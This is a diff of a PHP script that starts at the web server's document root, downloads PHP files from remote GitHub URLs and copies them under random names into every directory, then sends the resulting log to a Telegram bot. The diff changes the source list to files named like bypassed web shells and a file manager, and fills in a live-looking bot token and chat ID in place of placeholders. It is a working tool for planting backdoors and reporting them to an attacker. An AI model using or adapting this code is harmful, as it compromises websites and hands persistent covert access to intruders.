@@ -4,21 +4,16 @@ error_reporting(0);
 // ================= CONFIGURATION ================= //
 $searchDir = $_SERVER['DOCUMENT_ROOT'];
 $sourceUrls = [
-    "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/peringatan.php",
-    "https://raw.githubusercontent.com/example/source2/main/backup.php",
-    "https://raw.githubusercontent.com/example/source3/main/backup.php"
+    "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/anonsec.php",
+    "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/ninjaku.php",
+    "https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php"
 ];
 $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
-$logFile = "copy_report_" . date('Y-m-d_His') . ".txt";
+$logFile = "backup_bos_" . date('Y-m-d_His') . ".txt";
 
-// Telegram Configuration - REPLACE WITH YOUR OWN VALUES
-$telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-$telegramChatID = 'YOUR_CHAT_ID';
-// ================================================= //
+$telegramBotToken = '7854967947:AAHnbDkENz6J55u475WFrQARtOU3XCokEmk';
+$telegramChatID = '7843818472';
 
-/**
- * Generate random filename (7 alphanumeric characters + .php extension)
- */
 function generateRandomName($length = 7) {
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     $randomString = '';
@@ -28,11 +23,7 @@ function generateRandomName($length = 7) {
     return $randomString . '.php';
 }
 
-/**
- * Fetch content from URL with multiple fallback methods
- */
 function fetchContent($url) {
-    // Try with cURL first
     if (function_exists('curl_version')) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -84,13 +75,9 @@ function fetchContent($url) {
     return false;
 }
 
-/**
- * Send file to Telegram with caption
- */
 function sendFileToTelegram($filePath, $caption, $botToken, $chatID) {
     $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
     
-    // Check if file exists and is readable
     if (!file_exists($filePath) || !is_readable($filePath)) {
         return false;
     }
@@ -116,9 +103,6 @@ function sendFileToTelegram($filePath, $caption, $botToken, $chatID) {
     return $httpCode === 200;
 }
 
-/**
- * Main function to copy files to all directories
- */
 function copyToAllDirectories($dir, $urls, $logFile, $baseUrl, $telegramConfig) {
     if (!is_dir($dir)) {
         file_put_contents($logFile, "[ERROR] Directory not found: $dir\n", FILE_APPEND);
@@ -133,7 +117,6 @@ function copyToAllDirectories($dir, $urls, $logFile, $baseUrl, $telegramConfig) 
     $logEntries = [];
     $contents = [];
 
-    // Fetch all source contents
     foreach ($urls as $url) {
         $content = fetchContent($url);
         if ($content !== false && !empty($content)) {
